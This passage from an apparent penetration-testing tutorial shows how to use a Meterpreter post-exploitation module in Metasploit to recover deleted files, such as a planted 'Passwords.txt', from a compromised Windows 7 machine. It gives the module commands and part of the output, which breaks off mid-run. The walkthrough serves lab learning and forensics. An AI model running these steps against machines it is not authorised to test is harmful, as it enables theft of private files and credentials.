    # Playing with Modules - Recovering Deleted Files from Remote Shell


    Now let''s take a second and talk about something little more advanced. Let''s
    see how to use one of the included Meterpreter modules to recover files that have
    been deleted from a remote drive. The “recovery_files” script allows you to recover
    files that the target user has deleted from his system. This could be very handy,
    as deleted files contain information of interest for both forensics and pentesting.
    System files, account information, and important documents are just a sample.
    To prep this example, I simply took my Windows 7 system and created a fake “Passwords.txt”
    file and saved a copy of “Discovery.pdf” on the E: drive. I then deleted the files:


    ![](img/ff9cd19afe449ae54278ee429e668a6f_56_0.png)


    # Using the Module


    The module requires that you have an open session to the target that you want
    to check. Once you get a successful remote session, simply type, “background”
    to temporarily back out of the session to the msf prompt and use the module as
    shown below:


    ```

    msf > use post/windows/forensics/recovery_files

    msf(recovery_files) > show options


    Name | Default | Description

    --- | --- | ---

    DRIVE | C: | yes | The drive you want to recover files from.

    FILES | no | extensions of the files to enumerate.

    SESSION | yes | The session to run this module on.

    TIMEOUT | 3600 | Search timeout. The module will go through the entire disk.

    msf(recovery_files) > set drive E

    msf(recovery_files) > set SESSION 1

    msf(recovery_files) >

    ```


    As you can see in the screenshot, there are a couple of settings that need to
    be set. If you just want to see what files are there, you only need to set the
    “Drive” and “Session” settings as shown above. Then just run the exploit:


    ```msf(recovery_files) > run

    [*] System Info - OS Windows 7 (Build 7601, Service Pack 1), Drive: E:

    [*] MFT is made up of 1 data

